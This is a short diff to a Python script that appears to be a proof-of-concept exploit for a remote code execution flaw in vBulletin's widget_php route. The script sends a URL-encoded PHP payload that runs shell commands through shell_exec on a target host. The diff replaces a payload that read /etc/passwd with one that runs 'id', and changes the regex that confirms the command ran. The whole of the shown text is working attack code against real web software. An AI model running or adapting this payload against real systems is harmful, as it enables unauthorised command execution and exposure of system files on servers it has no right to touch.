@@ -10,11 +10,11 @@ address =(sys.argv[1], sys.argv[2])
 dst_addr=":".join(address)
 print(dst_addr)
 URL="http://"+dst_addr
-data ={"routestring" : "ajax%2Frender%2Fwidget_php&widgetConfig%5Bcode%5D=%7B%27widgetConfig%5Bcode%5D%27%3A+%22echo+shell_exec%28%27cat+%2Fetc%2Fpasswd%27%29%3Bexit%3B%22%7D"}
+data ={"routestring" : "ajax%2frender%2fwidget_php%26widgetConfig%5bcode%5d%3d%7b'widgetConfig%5bcode%5d'%3a+%22echo+shell_exec('id')%3bexit%3b%22%7d%0a"}
 res = requests.post(URL, data=data)
 response = res.text
 
-p = re.compile('.*:x:\d')
+p = re.compile('uid=\d')
 m = p.match(response)
 print("Status Code : %d"% res.status_code)
 if m:
